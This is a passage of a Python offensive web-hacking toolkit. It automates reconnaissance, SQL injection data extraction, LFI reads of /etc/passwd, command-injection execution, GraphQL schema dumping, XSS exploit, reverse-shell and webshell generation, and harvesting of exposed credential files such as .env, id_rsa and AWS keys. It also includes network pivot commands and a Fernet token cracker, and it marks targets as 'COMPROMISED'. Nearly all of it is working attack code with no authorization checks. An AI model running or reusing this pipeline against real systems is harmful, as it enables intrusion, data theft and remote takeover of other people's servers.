            result["recon"]["waf"] = waf
            logger.debug(f"    ? WAFs detected: {', '.join([w['waf'] for w in waf])}")
    except Exception:pass
    
    # -- PHASE 2: VULNERABILITY SCANNING --
    logger.debug(f"\n{Fore.YELLOW}[PHASE 2/5: VULNERABILITY SCANNING]{Style.RESET_ALL}")
    
    if parsed.query:
        # SQL Injection
        logger.debug(f"  ? SQL Injection Scan...")
        try:
            sqli = scan_sqli(target_url)
            if sqli:
                result["vulnerabilities"].extend(sqli)
                logger.debug(f"    ! Found {len(sqli)} SQLi vectors")
                for v in sqli[:3]:
                    logger.debug(f"      - {v['type']} on param '{v.get('parameter','')}' (conf: {v.get('confidence',0):.0%})")
                    # Try exploitation
                    if v.get('confidence', 0) >= 0.8:
                        extracted = exploit_sqli_extract(target_url, v.get('parameter',''), technique="error")
                        if extracted:
                            result["extracted_data"].extend(extracted)
                            for e in extracted:
                                logger.debug(f"      ? Extracted: {e.get('field','')} = {e.get('value','')[:80]}")
        except Exception as e:
            result["errors"].append(f"SQLi: {str(e)[:50]}")
        
        # XSS
        logger.debug(f"  ? XSS Scan...")
        try:
            xss = scan_xss(target_url)
            if xss:
                result["vulnerabilities"].extend(xss)
                logger.debug(f"    ! Found {len(xss)} XSS vectors")
                for v in xss[:3]:
                    logger.debug(f"      - {v['type']} on param '{v.get('parameter','')}'")
        except Exception as e:
            result["errors"].append(f"XSS: {str(e)[:50]}")
        
        # LFI
        logger.debug(f"  ? LFI Scan...")
        try:
            lfi = scan_lfi(target_url)
            if lfi:
                result["vulnerabilities"].extend(lfi)
                logger.debug(f"    ! Found {len(lfi)} LFI vectors")
                for v in lfi[:3]:
                    logger.debug(f"      - {v['type']} on param '{v.get('parameter','')}' ({v.get('indicator','')})")
                    # Try exploitation
                    content = exploit_lfi_read(target_url, v.get('parameter',''), "/etc/passwd")
                    if content.get("content"):
                        result["extracted_data"].append({"type": "LFI_FILE", "file": "/etc/passwd", "content": content["content"][:500]})
                        logger.debug(f"      ? /etc/passwd content extracted ({len(content['content'])} chars)")
        except Exception as e:
            result["errors"].append(f"LFI: {str(e)[:50]}")
        
        # Command Injection
        logger.debug(f"  ? Command Injection Scan...")
        try:
            cmdi = scan_cmdi(target_url)
            if cmdi:
                result["vulnerabilities"].extend(cmdi)
                logger.debug(f"    ! Found {len(cmdi)} command injection vectors")
                for v in cmdi[:2]:
                    logger.debug(f"      - {v['type']} on param '{v.get('parameter','')}'")
                    # Try exploitation
                    cmd_result = exploit_cmdi_execute(target_url, v.get('parameter',''), "id")
                    if cmd_result and any("uid" in str(s) for s in cmd_result.values()):
                        result["extracted_data"].append({"type": "RCE", "command": "id", "output": str(cmd_result)[:500]})
                        logger.debug(f"      ? RCE confirmed! Output: {str(cmd_result)[:200]}")
        except Exception as e:
            result["errors"].append(f"CMDI: {str(e)[:50]}")
        
        # SSRF
        logger.debug(f"  ? SSRF Scan...")
        try:
            ssrf = scan_ssrf(target_url)
            if ssrf:
                result["vulnerabilities"].extend(ssrf)
                logger.debug(f"    ! Found {len(ssrf)} SSRF vectors")
        except Exception as e:
            result["errors"].append(f"SSRF: {str(e)[:50]}")
        
        # SSTI
        logger.debug(f"  ? SSTI Scan...")
        try:
            ssti = scan_ssti(target_url)
            if ssti:
                result["vulnerabilities"].extend(ssti)
                logger.debug(f"    ! Found {len(ssti)} SSTI vectors")
        except Exception as e:
            result["errors"].append(f"SSTI: {str(e)[:50]}")
    
    # Open Redirect
    logger.debug(f"  ? Open Redirect Scan...")
    try:
        redir = scan_open_redirect(target_url)
        if redir:
            result["vulnerabilities"].extend(redir)
            logger.debug(f"    ! Found {len(redir)} open redirects")
    except Exception:pass
    
    # CORS
    logger.debug(f"  ? CORS Misconfiguration Scan...")
    try:
        cors = scan_cors(target_url)
        if cors:
            result["vulnerabilities"].extend(cors)
            logger.debug(f"    ! Found {len(cors)} CORS misconfigurations")
    except Exception:pass
    
    # XXE
    logger.debug(f"  ? XXE Scan...")
    try:
        xxe = scan_xxe(target_url)
        if xxe:
            result["vulnerabilities"].extend(xxe)
            logger.debug(f"    ! Found {len(xxe)} XXE vectors")
    except Exception:pass
    
    # -- PHASE 3: DIRECTORY ENUMERATION --
    if not quick:
        logger.debug(f"\n{Fore.YELLOW}[PHASE 3/5: DIRECTORY ENUMERATION]{Style.RESET_ALL}")
        logger.debug(f"  ? Directory Brute Force...")
        try:
            dirs = dir_bruteforce(target_url, max_workers=15, timeout=5)
            result["recon"]["directories"] = dirs[:30]
            sensitive = [d for d in dirs if d["status"] in [200, 401, 403] and ("admin" in d["url"] or "config" in d["url"] or "backup" in d["url"] or ".env" in d["url"] or "wp-" in d["url"])]
            if sensitive:
                logger.debug(f"    ! Sensitive paths found:")
                for d in sensitive[:8]:
                    logger.debug(f"      - {d['url']} [{d['status']}]")
            logger.debug(f"    ? Total: {len(dirs)} paths discovered")
        except Exception:pass
    
    # -- PHASE 4: API EXPLOITATION --
    logger.debug(f"\n{Fore.YELLOW}[PHASE 4/5: API & SERVICE EXPLOITATION]{Style.RESET_ALL}")
    
    # API endpoints
    logger.debug(f"  ? API Endpoint Detection...")
    try:
        apis = detect_api_endpoints(target_url)
        if apis:
            result["recon"]["api_endpoints"] = apis
            logger.debug(f"    ? Found {len(apis)} API endpoints")
            for a in apis[:5]:
                logger.debug(f"      - {a['path']} [{a['status']}] {a.get('type','')}")
            
            # Try GraphQL introspection
            for a in apis:
                if "GraphQL" in a.get("type", ""):
                    gql = exploit_graphql_introspection(target_url + a["path"])
                    if "error" not in gql:
                        result["extracted_data"].append({"type": "GRAPHQL_SCHEMA", "data": gql})
                        logger.debug(f"    ! GraphQL schema extracted! {len(gql.get('types',[]))} types, {len(gql.get('queries',[]))} queries")
        else:
            logger.debug(f"    - No API endpoints found")
    except Exception:pass
    
    # -- PHASE 5: EXPLOITATION & REPORTING --
    logger.debug(f"\n{Fore.YELLOW}[PHASE 5/5: EXPLOITATION & REPORT]{Style.RESET_ALL}")
    
    # Generate exploit payloads if vulnerabilities found
    if result["vulnerabilities"]:
        logger.debug(f"  ? Generating exploit payloads...")
        for v in result["vulnerabilities"]:
            if v.get("type") in ["Reflected XSS", "POST XSS"] and v.get("parameter"):
                exploit = generate_xss_exploit(target_url, v["parameter"])
                if exploit:
                    v["exploit_url"] = exploit.get("exploit_url", "")
                    v["exploit_payload"] = exploit.get("payload", "")
                    result["exploits"].append({"type": "XSS_EXPLOIT", "payload": exploit["payload"][:100]})
    
    # Generate reverse shells if RCE found
    for v in result["vulnerabilities"]:
        if "Command Injection" in str(v.get("type", "")) or "RCE" in str(v.get("type", "")):
            shells = generate_reverse_shell("YOUR_IP", "4444")
            result["shells"] = shells
            logger.debug(f"  ? Reverse shell payloads generated ({len(shells)} variants)")
            break
    
    # Generate webshells
    webshells = generate_webshell("all")
    result["shells"].update({"webshells": list(webshells.keys())})
    
    # -- SUMMARY --
    vuln_count = len(result["vulnerabilities"])
    exploit_count = len(result["exploits"])
    data_count = len(result["extracted_data"])
    cred_count = len(result["credentials"])
    
    severity_scores = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for v in result["vulnerabilities"]:
        sev = v.get("severity", "MEDIUM")
        if sev in severity_scores:
            severity_scores[sev] += 1
    
    if vuln_count > 0:
        result["summary"] = (
            f"COMPROMISE ACHIEVED: {vuln_count} vulnerabilities "
            f"({severity_scores['CRITICAL']} critical, {severity_scores['HIGH']} high), "
            f"{exploit_count} exploits generated, "
            f"{data_count} data extractions, "
            f"{len(result['recon'].get('ports',[]))} open ports."
        )
        result["status"] = "COMPROMISED"
    else:
        result["summary"] = (
            f"Scan completed. No obvious vulnerabilities found via automated checks. "
            f"{len(result['recon'].get('ports',[]))} open ports."
        )
        result["status"] = "SCANNED"
    
    result["completed"] = datetime.now().isoformat()
    
    logger.debug(f"\n{Fore.GREEN}{'='*65}")
    logger.debug(f"  MISSION COMPLETE -- {result['status']}")
    logger.debug(f"{'='*65}{Style.RESET_ALL}")
    logger.debug(f"  Target: {target_url}")
    logger.debug(f"  Vulnerabilities: {vuln_count} ({severity_scores['CRITICAL']}C/{severity_scores['HIGH']}H/{severity_scores['MEDIUM']}M)")
    logger.debug(f"  Exploits Generated: {exploit_count}")
    logger.debug(f"  Data Extracted: {data_count} items")
    logger.debug(f"  Credentials Found: {cred_count}")
    logger.debug(f"  Open Ports: {len(result['recon'].get('ports',[]))}")
    logger.debug(f"  Duration: {(datetime.fromisoformat(result['completed']) - datetime.fromisoformat(result['started'])).total_seconds():.1f}s")
    logger.debug(f"{Fore.GREEN}{'='*65}{Style.RESET_ALL}\n")
    
    return result

# ===============================================================================
# SECTION 21: ADVANCED CREDENTIAL HARVESTING
# ===============================================================================

def scan_for_sensitive_files(url, timeout=10):
    """Scan for exposed sensitive files."""
    sensitive_patterns = [
        ".env", ".git/config", ".svn/entries", "wp-config.php",
        "config.php", "config.inc.php", "database.php", "db.php",
        "configuration.php", "settings.php", "config.json",
        "credentials.json", "service-account.json", "key.json",
        "id_rsa", "id_rsa.pub", ".ssh/id_rsa",
        "aws/credentials", ".aws/credentials", "credentials",
        "npmrc", ".npmrc", ".dockercfg",
        "docker-compose.yml", "Dockerfile",
        "composer.json", "composer.lock",
        "package.json", "yarn.lock", "package-lock.json",
        "phpinfo.php", "info.php", "test.php",
        "robots.txt", "sitemap.xml",
        "server-status", "server-info",
        "debug.log", "error.log", "access.log",
        "backup.sql", "database.sql", "dump.sql", "db.sql",
        "backup.zip", "backup.tar.gz", "backup.tar",
        "SECRET_KEY", "secret_key", "api_key", "API_KEY",
        "password.txt", "passwords.txt", "secrets.txt",
        "htpasswd", ".htpasswd",
    ]
    
    found = []
    base = url.rstrip("/")
    
    for pattern in sensitive_patterns[:30]:  # First 30
        try:
            resp = get_session(timeout=timeout).get(f"{base}/{pattern}", allow_redirects=False)
            if resp.status_code in [200, 201, 204, 401, 403]:
                size = len(resp.content)
                content_type = resp.headers.get("Content-Type", "")
                found.append({"path": pattern, "status": resp.status_code, "size": size, "type": content_type[:50]})
                # For text files, capture content
                if size < 5000 and "text" in content_type:
                    found[-1]["preview"] = resp.text[:200]
            resp.close()
        except Exception:pass
    
    return found

# ===============================================================================
# SECTION 22: NETWORK PIVOT COMMANDS
# ===============================================================================

def generate_pivot_commands(local_ip, target_subnet):
    """Generate commands for network pivoting."""
    commands = {
        "ssh_tunnel": f"ssh -L 8080:{target_subnet}.1:80 user@{local_ip}",
        "socks_proxy": f"ssh -D 9050 user@{local_ip}",
        "chisel_client": f"./chisel client {local_ip}:8080 R:socks",
        "chisel_server": f"./chisel server -p 8080 --reverse",
        "meterpreter": f"route add {target_subnet}.0 255.255.255.0 1",
        "port_forward": f"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress={target_subnet}.1",
        "ligolo_agent": f"./ligolo-agent -connect {local_ip}:11601 -ignorecert",
        "ligolo_proxy": f"./ligolo-proxy -selfcert",
    }
    return commands

# ===============================================================================
# SECTION 23: CRYPTO ATTACKS
# ===============================================================================

def crack_fernet_token(token, wordlist=None):
    """Attempt to crack a Fernet token."""
    if wordlist is None:
        wordlist = COMMON_PASSWORDS + COMMON_JWT_SECRETS
    
    for secret in wordlist:
        try:
            key = base64.urlsafe_b64encode(hashlib.sha256(secret.encode()).digest())
            f = Fernet(key)
            decrypted = f.decrypt(token.encode())
            return {"cracked": True, "secret": secret, "data": decrypted.decode('utf-8', errors='ignore')[:500]}
        except Exception:
            continue
    return {"cracked": False}

def test_weak_encryption(data_text):
    """Test for common weak encryption patterns."""
    results = []
    
    # Base64 detection
    try:
        decoded = base64.b64decode(data_text).decode('utf-8', errors='ignore')
        if decoded.isprintable() and len(decoded) > 5:
            results.append({"type": "Base64", "decoded": decoded[:200]})
    except Exception:pass
    
    # Hex detection
    if re.match(r'^[0-9a-fA-F]+$', data_text) and len(data_text) % 2 == 0:
        try:
            decoded = bytes.fromhex(data_text).decode('utf-8', errors='ignore')
            if decoded.isprintable() and len(decoded) > 2:
                results.append({"type": "Hex", "decoded": decoded[:200]})
        except Exception:pass
    
    # ROT13
    try:
        import codecs
        decoded = codecs.decode(data_text, 'rot_13')
        if decoded.isprintable() and any(w in decoded.lower() for w in ["the", "and", "is", "are", "for", "admin", "password"]):
            results.append({"type": "ROT13", "decoded": decoded[:200]})
    except Exception:pass
    
    # XOR with common keys
    common_xor_keys = [b'secret', b'key', b'xor', b'encrypt', b'\x00']
    for key in common_xor_keys:
        try:
            decoded = bytes([data_text[i] ^ key[i % len(key)] for i in range(min(len(data_text), 200))])
            if decoded.isprintable() and len(decoded) > 5:
                results.append({"type": f"XOR (key={key})", "decoded": decoded[:200].decode('utf-8', errors='ignore')})
                break
        except Exception:pass
    
    return results

# ===============================================================================
# SECTION 24: FULL HACK -- ONE FUNCTION TO COMPROMISE EVERYTHING
# ===============================================================================

def hack_full(target_url, intense=False):
    """Full hack process - comprehensive exploitation pipeline.
    Combines all modules for maximum attack surface coverage."""
    return hack_website(target_url, quick=not intense, intense=intense)

def hack_deep(target_url):
    """Deep hack mode -- maximum thoroughness.
    Scans subdomains, deep directory brute force, all port ranges."""
    return hack_website(target_url, quick=False, intense=True)

# --- Session management -------------------------------------------------------
OMEGA_HACKER_SESSION = {}
